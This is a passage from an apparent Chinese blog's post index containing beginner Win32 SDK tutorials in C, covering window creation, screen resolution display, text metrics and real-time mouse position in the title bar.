指定窗口过程(回调函数)</span></span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;<span class="comment">// 预留的额外空间, 一般设为0</span></span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);<span class="comment">// 设定图标</span></span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">// 设定光标</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);<span class="comment">// 窗口背景色</span></span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;<span class="comment">// 菜单名字</span></span><br><span class="line">wndclass.lpszClassName = szAppName;<span class="comment">// 窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))<span class="comment">// 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这个程序需要在Windows NT才能执行!&quot;</span>), szAppName, MB_ICONERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd = CreateWindow(szAppName,</span><br><span class="line">TEXT(<span class="string">&quot;快乐小凳凳&quot;</span>),</span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">hInstance,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxClient, cyClient;</span><br><span class="line">TCHAR szBuffer[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rect);</span><br><span class="line">cxClient = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">cyClient = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line">StringCchPrintf(szBuffer, <span class="number">128</span>, TEXT(<span class="string">&quot;当前显示器的分辨率是: %d * %d px&quot;</span>), cxClient, cyClient);</span><br><span class="line">DrawText(hdc, szBuffer, <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>); <span class="comment">// 正式关闭窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置字母尺寸</title>
      <link href="/post/fd3620e9.html"/>
      <url>/post/fd3620e9.html</url>
      
        <content type="html"><![CDATA[<p><strong>分析：在<code>WM_CREATE</code>消息中获取字母宽度与高度修改后存入变量，在WM_PAINT消息中打印时直接在TextOut函数里面使用变量进行设置</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;MyWindows&quot;</span>);<span class="comment">// 注意使用TEXT包裹语句</span></span><br><span class="line">HWND hwnd;<span class="comment">// 窗口句柄</span></span><br><span class="line">MSG msg;<span class="comment">// 消息结构</span></span><br><span class="line">WNDCLASS wndclass;<span class="comment">// 窗口类, 定义窗口基本属性</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">// CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘</span></span><br><span class="line">wndclass.lpfnWndProc = WndProc;<span class="comment">// 指定窗口过程(回调函数)</span></span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;<span class="comment">// 预留的额外空间, 一般设为0</span></span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);<span class="comment">// 设定图标</span></span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">// 设定光标</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);<span class="comment">// 窗口背景色</span></span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;<span class="comment">// 菜单名字</span></span><br><span class="line">wndclass.lpszClassName = szAppName;<span class="comment">// 窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))<span class="comment">// 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这个程序需要在Windows NT才能执行!&quot;</span>), szAppName, MB_ICONERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd = CreateWindow(szAppName,</span><br><span class="line">TEXT(<span class="string">&quot;快乐小凳凳&quot;</span>),</span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">hInstance,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line">TCHAR szBuffer[<span class="number">128</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">size_t</span> iTarget;</span><br><span class="line">TEXTMETRIC tm;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxChar, cyChar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">hdc = GetDC(hwnd);</span><br><span class="line">GetTextMetrics(hdc, &amp;tm);</span><br><span class="line">cxChar = tm.tmAveCharWidth;<span class="comment">// 平均宽度(大写字母一般取平均宽度的1.5倍)</span></span><br><span class="line">cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line">ReleaseDC(hwnd, hdc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">StringCchPrintf(szBuffer, <span class="number">128</span>, TEXT(<span class="string">&quot;%d: %s&quot;</span>), i + <span class="number">1</span>, TEXT(<span class="string">&quot;I love WY!&quot;</span>));</span><br><span class="line">StringCchLength(szBuffer, <span class="number">128</span>, &amp;iTarget);</span><br><span class="line">TextOut(hdc, cxChar, i * cyChar, szBuffer, iTarget);</span><br><span class="line">&#125;</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>); <span class="comment">// 正式关闭窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实时获取鼠标位置</title>
      <link href="/post/720c035f.html"/>
      <url>/post/720c035f.html</url>
      
        <content type="html"><![CDATA[<p><strong>分析：窗口框架直接搬过来，修改回调函数WndProc，利用<code>WM_MOUSEMOVE</code>消息中的<code>lParam</code>参数获取实时鼠标位置并输出在左上角</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;MyWindows&quot;</span>);<span class="comment">// 注意使用TEXT包裹语句</span></span><br><span class="line">HWND hwnd;<span class="comment">// 窗口句柄</span></span><br><span class="line">MSG msg;<span class="comment">// 消息结构</span></span><br><span class="line">WNDCLASS wndclass;<span class="comment">// 窗口类, 定义窗口基本属性</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">// CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘</span></span><br><span class="line">wndclass.lpfnWndProc = WndProc;<span class="comment">// 指定窗口过程(回调函数)</span></span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;<span class="comment">// 预留的额外空间, 一般设为0</span></span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);<span class="comment">// 设定图标</span></span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">// 设定光标</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);<span class="comment">// 窗口背景色</span></span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;<span class="comment">// 菜单名字</span></span><br><span class="line">wndclass.lpszClassName = szAppName;<span class="comment">// 窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))<span class="comment">// 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这个程序需要在Windows NT才能执行!&quot;</span>), szAppName, MB_ICONERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd = CreateWindow(szAppName,</span><br><span class="line">TEXT(<span class="string">&quot;快乐小凳凳&quot;</span>),</span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">hInstance,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_MOUSEMOVE:</span><br><span class="line"><span class="type">int</span> x = LOWORD(lParam);</span><br><span class="line"><span class="type">int</span> y = HIWORD(lParam);</span><br><span class="line"><span class="comment">// 在WM_MOUSEMOVE消息中lParam的高16位为鼠标纵坐标，低16位为鼠标横坐标</span></span><br><span class="line"><span class="type">wchar_t</span> str[<span class="number">100</span>];</span><br><span class="line">StringCchPrintf(str, <span class="number">100</span>, TEXT(<span class="string">&quot;当前鼠标位置: (%d, %d)&quot;</span>), x, y);</span><br><span class="line">SetWindowText(hwnd, str);</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rect);</span><br><span class="line">DrawText(hdc, TEXT(<span class="string">&quot;当前鼠标位置请看左上角^_^&quot;</span>), <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>); <span class="comment">// 正式关闭窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一个完整窗口</title>
      <link href="/post/70294708.html"/>
      <url>/post/70294708.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;MyWindows&quot;</span>);<span class="comment">// 注意使用TEXT包裹语句</span></span><br><span class="line">HWND hwnd;<span class="comment">// 窗口句柄</span></span><br><span class="line">MSG msg;<span class="comment">// 消息结构</span></span><br><span class="line">WNDCLASS wndclass;<span class="comment">// 窗口类, 定义窗口基本属性</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">// CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘</span></span><br><span class="line">wndclass.lpfnWndProc = WndProc;<span class="comment">// 指定窗口过程(回调函数)</span></span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;<span class="comment">// 预留的额外空间, 一般设为0</span></span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);<span class="comment">// 设定图标</span></span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">// 设定光标</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);<span class="comment">// 窗口背景色</span></span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;<span class="comment">// 菜单名字</span></span><br><span class="line">wndclass.lpszClassName = szAppName;<span class="comment">// 窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))<span class="comment">// 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这个程序需要在Windows NT才能执行!&quot;</span>), szAppName, MB_ICONERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd = CreateWindow(szAppName,</span><br><span class="line">TEXT(<span class="string">&quot;快乐小凳凳&quot;</span>),</span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">// 窗口风格</span></span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">hInstance,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line"><span class="type">char</span> *str = TEXT(<span class="string">&quot;大家好, 这是我的第一个窗口程序!&quot;</span>);</span><br><span class="line">RECT rect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rect);</span><br><span class="line">DrawText(hdc, TEXT(<span class="string">&quot;大家好, 这是我的第一个窗口程序!&quot;</span>), <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>); <span class="comment">// 正式关闭窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>switch+level实现税后工资计算</title>
      <link href="/post/473fce30.html"/>
      <url>/post/473fce30.html</url>
      
